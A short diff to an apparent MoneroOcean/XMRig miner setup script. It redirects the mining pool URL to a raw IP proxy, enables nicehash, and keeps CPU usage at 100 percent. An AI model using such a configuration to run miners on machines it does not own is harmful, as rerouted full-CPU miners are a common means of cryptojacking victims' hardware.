@@ -270,7 +270,8 @@ if [ ! -z $EMAIL ]; then
 fi
 
 #sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
-sed -i 's/"url": *"[^"]*",/"url": "3.136.160.170:8080",/' $HOME/moneroocean/config.json
+#sed -i 's/"url": *"[^"]*",/"url": "3.136.160.170:8080",/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "82.196.117.130:6996",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
@@ -278,7 +279,7 @@ sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOM
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json
 
 #enable Nicehash
-#sed -i 's/"nicehash": *false,/"nicehash": true,/' $HOME/moneroocean/config.json
+sed -i 's/"nicehash": *false,/"nicehash": true,/' $HOME/moneroocean/config.json
 sed -i 's/"rig-id": null,/"rig-id": true,/' $HOME/moneroocean/config.json
 
 cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
